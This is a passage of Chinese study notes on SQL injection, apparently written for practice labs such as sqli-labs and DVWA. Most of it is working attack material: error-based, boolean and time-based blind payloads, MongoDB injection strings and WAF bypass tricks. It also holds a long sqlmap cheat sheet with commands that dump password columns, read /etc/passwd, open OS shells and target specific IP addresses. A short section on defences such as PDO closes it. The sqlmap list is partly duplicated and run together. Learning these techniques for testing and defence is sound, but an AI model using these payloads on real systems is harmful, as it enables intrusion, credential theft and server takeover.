  其中的concat()函数是将其参数连成一个字符串，因此不会符合xpath_expr的格式，从而出现格式错误，爆出

  ![image-20220727193832420](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727193832420.png)

- `UpdateXML(xml_document, xpath_expr, new_xml)`

  xml_document：String格式，为XML文档对象的名称

  xpath_expr：Xpath格式的字符串

  new_xml：String格式，替换查找到的符合条件的数据

  作用：改变文档中符合条件的节点的值，即改变XML_document中符合XPATH_string的值

  此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为新的XML片段 new_xml，然后返回更改的XML。xml_document替换的部分 与xpath_expr用户提供的XPath表达式匹配。

  如果未xpath_expr找到表达式匹配，或者找到多个匹配项，则该函数返回原始xml_document的XML片段。所有三个参数都应该是字符串。

  和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：

  ![1551929714141](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1551929714141.png)

  ```mysql
  // insert
  username=x' or updatexml(1,concat(0x7e,(version())),0) or '
  
  // update
  add=hubeNicky' or  updatexml(1,concat(0x7e,(version())),0) or '
  
  // delete
  ?id=56+or+updatexml+(1,concat(0x7e,database()),0)
  ```

  ![image-20220727195708498](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195708498.png)

  ![image-20220727195718450](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195718450.png)

#### 基于布尔的SQL盲注（其次）

逻辑判断，regexp正则表达式，like，ascii，left，ord返回字符串第一个字符的ascii码，mid取字符串子串。

布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。

- **猜解数据库长度**

  ```m'y
  ' or length(database()) > 8 --+    # 符合条件返回正确，反之返回错误
  ```

- **猜解数据库名**

  ```
  'or mid(database(),1,1)='z' --+
  'or ORD(mid(database(),1,1)) > 100 --+ :  # 因为需要验证的字符太多，所以可以转化为ascii码验证
  ```

- **猜解表的总数**

  ```
  'or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   # 判断表的总数
  ```

- **猜解各个表名的长度**

  ```
  'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+
  'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）
  ```

- **猜解第一个表名**

  ```
  'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1) = 'a'  --+
  或者
  'rr ord(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) >100  --+
  ```

- **猜解表的字段的总数**

  ```
  'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 0,1) = 10 --+
  'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 10 --+ （第二个字段）
  ```

- **猜解第一个字段名**

  ```
  'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1) = 'i' --+
  或者
  'or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1)) > 100 --+
  或者直接猜解
  ' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 'username' --+
  ```

- **猜解内容长度**

  ```
  假如已经知道字段名为  id   username password
  'or (select Length(concat(username,"---",password)) from admin limit 0,1) = 16  --+
  ```

- **猜解内容**

  ```
  'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = 'a' --+
  或者
  'or ORD(mid((select concat(username,"-----",password) from admin limit 0,1),1,1)) > 100 --+    ASCII码猜解
  或者直接猜解
  'or (Select concat(username,"-----",password) from admin limit 0,1 ) = 'admin-----123456'   --+
  ```

#### 基于时间的SQL盲注（最后考虑）

对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 `sleep()` 、`benchmark()`函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。

延时判断，if、sleep。

- if(expr1, expr2,expr3)

  如果expr1是TRUE，则IF0的返回值为expr2;否则返回值则为expr3。if()的返回值为数字值或字符串值。具体情况视其所在语境而定。

  若数据库名为a，则回显123，否则回显456：

  ![image-20220727200138619](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200138619.png)

- if + sleep

  若数据库名为a，则延时1s，否则不延时。

  ![image-20220727200249771](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200249771.png)

```mysql
// 猜解数据库名长度，猜中了延时5s
id=1 and sleep(if(length(database())=8,5,0))--+

// 逐个猜解数据库名，猜中了延时5s
id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+

// 逐个猜解表名，猜中了延时5s
id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+
```

```
like 'ro%'						# 判断ro或ro...是否成立
regexp '^xiaodi[a-z]'			# 匹配xiaodi及xiaodi...等if(条件,5,0)
ord()                           # 转换成ascii码
mid (a, b, c)					# 从位置b开始，截取a字符串的c个字符
substr(a, b, c)					# 与mid函数一样，从b位置开始，截取字符串a的c长度
left (database(),1), database() # left(a,b)从左侧截取a的前b位
length(database())=8		    # 判断数据库database()名的长度
ord=ascii ascii(x)=97 			# 判断x的ascii码是否等于97
```

**盲注的加速方法**：

减少查询次数，提高查找的正确率。

- **二分法**爆破字符；

- **位运算法**

  每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&实现取某一位的值。

### 按照注入的数据类型

#### 数字型

现有的查询语句 Where 筛选条件匹配的字段是数值类型。构造注入语句时不需要单引号和#来闭合语法。

#### 字符型

现有的查询语句 Where 筛选条件匹配的字段是字符型。一般字符型注入需要构造单引号/双引号用于闭合语法，还需要加入注释符使原本的引号以及后面的语句无效。

**除单引号外，SQL语句也有其他的一些干扰符号：’ " % ) }等，具体需看写法。**

比如`select * from user where name like '%xiaodi%';`用于搜索name字段中含有`xiaodi`的记录。或者`select * from user where name=('xiaodi');`增加了括号。

这时注入的话就要考虑%来闭合语法。实际中应该用什么符号来闭合语法需要自己尝试。

==**如何判断字符型、数字型**==

比如在文本框中输入 `1 and 1=1` 和 `1 and 1=2`，若都能返回数据（都通过），说明可能注入漏洞不是数字型，应该是字符型形式 ；因为对于字符型，使用`?id=1 and 1=1`相当于执行的是`SELECT * FROM users WHERE id='1 and 1=1' LIMIT 0,1;`这样网站对于`'1 and 1=1'`或者`'1 and 1=2'`都是取前面的1，都返回数据。

此时在文本框输入 `1' and 1=1#`，可以返回数据，输入 `1' and 1=2#`，没有数据返回，说明注入成功，确认漏洞为`id='1' and 1=1#'`的字符型SQL注入；（注意：有时用于闭合语法的不一定为单引号，另外在mysql中一般注释后面的字句是采用的--+在有些的字句中采用#注释。需要多测试才能发现）

若在文本框中输入 `1 and 1=1` 和 `1 and 1=2`，前者返回数据，后者不返回，直接确定是 `id=1 and 1=1`的数值型形式。

#### 搜索型

使用了`select * from users where id like '%233'`之类的模糊匹配，

```
word=a%' and 1=1#     返回正确
word=a%' and 1=2#     返回错误
```

### 按照提交参数方式

```php
<?php 

$get=$_GET['g'];    //get接受参数名g的值赋值给变量get
echo $get;

$post=$_POST['p'];  //post接受参数名p的值赋值给变量post
echo $post;

$c=$_COOKIE['c'] ;
echo $c;

$r=$_REQUEST['r'] ;
echo $r;

$s=$_SERVER['HTTP USER AGENT'];    // php内置函数，用于获取一些参数信息
echo $s;

?>
```



<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727103622802.png" alt="image-20220727103622802" style="zoom:67%;" />

#### get数据注入

get数据的注入在前面已经详细说明。

#### post数据注入

（sqlilabs less 11）

网站的URL不会显示具体的参数，而是将参数放在web表单中以post请求的形式提交。

此时需要使用 Burpsuite 等工具来构造 POST 包。BP抓包之后在数据包中进行相同的注入流程。

或者使用hackbar构造post数据也可。

<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15617979867982.jpg" alt="img" style="zoom:33%;" />

#### cookie注入

（sqlilabs less 20）

有时网站对get、post请求都进行了关键词过滤，难以注入，但是忽略了cookie也可以传递参数。如果cookie的参数也被用于SQL语句，那么也有成功注入的可能。有时使用cookie传参时会与post冲突，此时可能需要改为使用GET请求。

![image-20220727144345092](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727144345092.png)

#### request请求注入

如果网站是request请求，那么可以在所有方法的位置提交，包括get、post、cookie。

下面的网站以get或post都能提交参数：

![image-20220727105414609](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727105414609.png)

#### $_SERVER注入

php内置函数，用于获取一些参数信息。

$_SERVER详解：https://blog.csdn.net/lky_for_lucky/article/details/111300340

```
$_SERVER['HTTP_ACCEPT_LANGUAGE'] //浏览器语言
$_SERVER['REMOTE_ADDR'] //当前用户IP
$_SERVER['REMOTE_HOST'] //当前用户[主机名]
```

如果通过$_SERVER获取的信息被用于SQL语句，那么就可能存在注入漏洞。

比如BP抓包后，将浏览器信息User-Agent进行修改。如果网站将User-Agent字段作为SQL语句的参数，那就可能存在注入成功的可能。

#### json数据注入

原理一样与其他注入一样，只是注入点改为json的键值对中的值。

<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1624337757521-14b7e701-9024-4ef6-9696-83c7fcef0409.png" alt="image.png" style="zoom:67%;" />

#### HTTP头部参数注入

（sqlilabs less 18）

有些网站调用php的$_SERVER获取一些HTTP头部信息，比如User-Agent。这些地方可以进行注入。

还有X- Forwarded- For，简称XFF头，它代表客户端真实的IP。这里也可以尝试进行注入。

![image-20220727145345768](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727145345768.png)

上例中的SQL语句为insert操作，无法像select一样回显信息，因此只能盲注。

## 8. 各种数据库注入

https://blog.csdn.net/qq_42438245/article/details/121579063

<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727150100470.png" alt="image-20220727150100470" style="zoom:50%;" />

**各种数据库的注入特点**

不同的数据库具有不同的注入特点，每个数据库支持的功能不一样，获取到的权限和可执行操作等不同。

包括access、mysql、mssql、mongoDB、postgresql、sqlite、oracle、sybase等。

### access注入（暴力）

access数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa，结构为表名/列名/数据，不同的网站会有各自的acess数据库。不会像mySQL那样一个网站的管理员可以操作多个mySQL数据库，导致存在跨库注入的情况。mySQL的结构为数据库名/表名/列名/数据。

access没有information_ schema表，数据库名、操作系统等等都无法查询，<u>只能暴力猜解表名、列名、数据</u>，可以通过一些暴库手段、目录猜解等下载数据库。

- 判断数据库类型

  由于各个数据库特征不同，这里直接使用sqlmap比较方便：

  ![image-20220727152142889](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727152142889.png)

- 判断注入点

- 猜解字段数量

  oder by

- 判断哪几个位置回显

  `?id=-1 union select 1,2,3`

- 暴力猜解表名、列名等信息

  比如猜当前表为admin，看是否成功返回数据：

  `?id=-1 union select 1,2,3 from admin`

使用工具进行暴力猜解：

尝试爆表名：`sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --tables` 

尝试爆表admin的列名： `sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --dump -T "admin"`

### msSQL注入（pangolin穿山甲）

- 判断数据库类型

  由于各个数据库特征不同，这里直接使用pangolin穿山甲工具进行判断：

  ![image-20220727153727547](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727153727547.png)

  从工具中还可以看到不同数据库可以获得的权限，明显msSQL可以得到更多权限。

  ![image-20220727154114341](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154114341.png)

  ![image-20220727154006163](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154006163.png)

  在信息一栏中可以查看到数据库的各种信息：版本、数据库名、计算机名、数据库名、管理员最高权限、Sql-server对应root （mysql）、数据库各表名、磁盘、用户组、用户等。

  <img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154518550.png" alt="image-20220727154518550" style="zoom:50%;" />

  在获取数据一栏中可以获取数据库信息，表名数据等

  <img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154538662.png" alt="image-20220727154538662" style="zoom:50%;" />

- msSQL的手工注入

  语句会与mySQL不同：

  https://www.cnblogs.com/wuhongbin/p/15582849.html

  https://www.cnblogs.com/xishaonian/p/6173644.html

### postgreSQL注入

- 可以使用工具：sqlmap、pangolin穿山甲

识别数据库类型：`sqlmap -u http://219.153.49.228:44677/new_list.php?id=1`

判断数据库权限：`sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3`

判断是否为数据库管理员：`sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3`

查看当前数据库：`sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch`

查看名为public的数据库的表名：`sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables`

查看表reg_users 的列名：`sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns`

查看表reg_users 的具体数据：`sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C "name,password" --dump --batch`

- 手工注入，某些语句会有差别：

  https://blog.csdn.net/hack8/article/details/6427911

  https://www.cnblogs.com/yilishazi/p/14710349.html

### Oracle注入

- 使用工具：sqlmap、pangolin穿山甲

  ![image-20220727162001437](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727162001437.png)

- 手工注入

  参考文档：https://www.cnblogs.com/peterpan0707007/p/8242119.html

### mongoDB注入

- 使用工具

  SQLmap不能识别MongoDB，这里介绍nosqlattack：https://github.com/youngyangyang04/NoSQLAttack

  首先输入目标网站IP：

  ![image-20220727164245044](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164245044.png)

  然后输入路径：

  ![image-20220727164313282](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164313282.png)

  尝试攻击：

  ![image-20220727164346561](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164346561.png)

- 手工注入

  参考文档：

  https://blog.csdn.net/qq_39936434/article/details/95319449

  https://www.cnblogs.com/wefeng/p/11503102.html

  Mongodb的查询文档方式与其他的数据库略微不同，当进行条件查询的时候，mysql是用where, 而mongodb是以键值对形式进行查询的。

  比如按id="1"查询表news中的数据：`select * from admin {'id': '1'})`。

  - 构建回显，mongoDB查询操作的源代码为findone({‘id’：‘1’})

    攻击语句：`/new_list.php?id=1'});return({title:1,content:'2`

    ![img](https://i0.hdslb.com/bfs/article/4e7e306f459dea0d7e0f0f629cfc5164865c521c.png@831w_207h_progressive.webp)

  - 爆库

    `/new_list.php?id=1'}); return ({title:tojson(db),content:'1`

    ---tojson() 方法可以将 Date 对象转换为字符串格式化为 JSON 数据格式，相当于MySQL的数据库名。

    ![img](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/58e82612a8625ea7cb239e0e56529d8b36c06def.png@831w_168h_progressive.webp)

  - 爆表

    `/new_list.php?id=1'});return({title:tojson(db.getCollectionNames()),content:'1` 

    db.getCollectionNames()返回的是数组，转化为json格式，相当于MySQL的tables。

    ![img](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/193beaae0edc48fde33c165acbb2ee1e430c4600.png@831w_210h_progressive.webp)

  - 查询指定数据

    `/new_list.php?id=1'});return({title:tojson(db.Authority_confidential.find()[0]),content:'1`

    元素集中查找使用E.find(expr)函数，用于从匹配的元素集E的子元素中找出与find指定表达式expr相匹配的元素集合，E 同 expr 可视作同父子元素关系.

    find()[0]为第一条数据，find()[1]为第二条

    由于是字典形式，所以键和值一起出来了，不需要额外查询列。

    ![img](https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/7bd9545127c9714df2a53416d7caa935b305e196.png@831w_290h_progressive.webp)

## 9. sqlmap

```shell
-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"#列出mysql数据库中的user表的所有字段
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库类型(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer ""     #使用referer欺骗(--referer "http://") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 

常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"
```

简单的注入流程：

```
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
```

确定要注入的URL，有时需要获取访问该网站所需的cookie。

### get数据注入

- 查询所有的数据库名

  ```shell
  sqlmap -u "http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' --dbs
  ```

- 查询指定数据库的所有表名信息

  ```shell
  sqlmap -u "http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' -D dvwa --table
  ```

- 查询指定表名下的所有列名信息

  ```shell
  sqlmap -u "http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' -D dvwa -T users --column
  ```

- 查询指定数据

  ```shell
  sqlmap -u "http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie 'security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3' -D dvwa -T users -C user,password --dump
  ```

### post数据注入

使用 SQLMap 自动完成 POST 注入，需要把正常 POST 包的内容复制到一个 txt 文档，再调用文档来进行注入。

先使用 Burpsuite 拦截正常 POST 包，右键 - 选择 Copy to file 复制到 /root/post.txt

<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618182311836.jpg" alt="img" style="zoom: 33%;" />

然后关闭 Burpsuite 的代理功能，再使用命令 `sqlmap -r /root/post.txt --dbs`，来查询数据库名称。

<img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618184176609.jpg" alt="img" style="zoom:33%;" />

使用 SQLMap 命令 `sqlmap -r /root/post.txt -D dvwa --table`，查询表名

使用 SQLMap 命令 `sqlmap -r /root/post.txt -D dvwa -T users --columns`，查询字段名

使用 SQLMap 命令 `sqlmap -r /root/post.txt -D dvwa -T users -C user,password --dump`，查询用户名和密码内容

## 8. SQL注入防护

### 字符转义

addslashes()、魔术引号开关、mysql_real_escape_string

<u>会对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</u>，会影响SQL注入语句中的路径信息。

**绕过方法**：

宽字节（待转义字符前加上%df）、

### 整数过滤

遇到 is_int() 函数过滤输入的情况：直接跑路，无法绕过

```php
if(is_int($id)){
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
	echo $sql;
	$result=mysql_query($sql);
}else{
	echo 'ni shi ge jj?';
}
```

### 过滤关键字

str_replace(‘被过滤参数’,’过滤参数’,$id)

```php
if(isset($_ GET['id'])){
	$id=$_ GET['id'];
	// 第一个参数是要过滤的值，第二个参数是过滤后的值
	$id=str_ replace('select' , 'fuck' ,$id)
	// logging the connection parameters to a file for analysis.
	$fp-fopen('result.txt','a');
	fwrite($fp, 'ID:'.$id."\n");
	fclose($fp);
}
```

过滤效果：select变成了fuck

### waf防护软件

阿里云盾、安全狗、宝塔

作用机制：过滤关键字

**绕过方法**：

1.  更改提交方法（get、post）

2.  **大小写混合**（绕开黑名单）

3. **解密编码类**（绕开黑名单）

   %0A为换行符；%23为#号；%20为空格

4. **注释符号混用**（绕开注释过滤）

   比如`/**/`、`/*!*/`

5. 等价函数替换（绕开关键字过滤）

6. 特殊符号混用（绕开关键字过滤）

   ```
   空格被过滤，用%a0代替；
   and和or被过滤：可以用&&和||来替代；
   ```

7. 借助数据库特性（多种SQL语句）

8. **HTTP参数污染**

   函数java_implimentation()的逻辑有严重错误： 一旦这个数组里的个数不止1个，并且每个组员都是id开头，那么返回只会返回第一个组员。比如id=1&id=sql_injection的结果为为id=1。但是`$id=$_GET['id']`取的是最后一个id，所以我们只需要把payload放在后面的id就好。

9. **垃圾数据溢出**

   waf只能匹配一千个，多了就不行了

### 使用预编译PDO

PDO 是 PHP Data Objects（PHP 数据对象）的缩写。是在 PHP5.1 版本之后开始支持的技术。不使用 PDO 技术时，SQL 语句是先在本地拼接完成后，再传递至数据库处理，所以会导致用户提交有猫腻的变量来改变原 SQL 语句的结构，从而实现 SQL 注入；使用 PDO 技术后，是**先把 SQL 语句的整体语法，匹配的参数用 `?` 当做占位符一起发送至数据库，然后再把用户提交的查询参数发送至数据库，由数据库来完成变量的转移处理。**用户输入只会被当成字符串字面值参数，而SQL语句则经过语法分析，生成执行命令。这样 SQL 语句的整体语法结构和变量分开两次传递至数据库，从而导致那些有猫腻的变量无法再改变 SQL 语句的原始结构。这种情况下，SQL 注入攻击几乎无法实现。这也是目前比较有效的防御 SQL 注入攻击的方法之一。

SQL关键字**无法进行预编译**，如表名或者列名字段，order by + 列名，in + 列名。